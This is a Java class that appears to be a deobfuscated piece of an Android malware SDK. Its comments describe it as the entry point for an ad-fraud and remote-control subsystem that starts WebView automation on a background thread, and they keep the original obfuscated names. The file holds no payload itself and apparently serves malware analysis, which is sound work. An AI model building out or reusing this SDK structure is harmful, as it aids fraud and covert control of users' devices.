package touch;

import android.content.Context;
import android.util.Log;

/**
 * Entry point for the malware SDK. Called by the host application to initialize
 * the ad-fraud / remote-control subsystem.
 *
 * Spawns a background thread that bootstraps the WebView automation pipeline
 * with the provided context and configuration string.
 *
 * Original obfuscated name: com.nied.lduvv.Kucopd
 */
public class SDKInitializer {

    /** Log tag used for initialization messages. */
    private static final String TAG = "Dllpgd";

    /**
     * Runnable that performs the actual initialization on a background thread.
     */
    public class InitRunnable implements Runnable {

        private final Context context;
        private final String configStr;

        public InitRunnable(String configStr, Context context) {
            this.configStr = configStr;
            this.context = context;
        }

        @Override
        public void run() {
            Log.i(TAG, "Kucopd init: " + this.configStr);
            // Delegates to the WebView automation bootstrap class
            // Original: new llllIllIl1().llllIIIIll1(context, configStr, null);
            new WebViewBootstrap().start(this.context, this.configStr, null);
        }
    }

    /**
     * Initializes the SDK on a background thread.
     *
     * @param context application context
     * @param config  configuration string (typically a JSON payload or identifier)
     */
    public static void init(Context context, String config) {
        new Thread(new SDKInitializer().new InitRunnable(config, context)).start();
    }
}
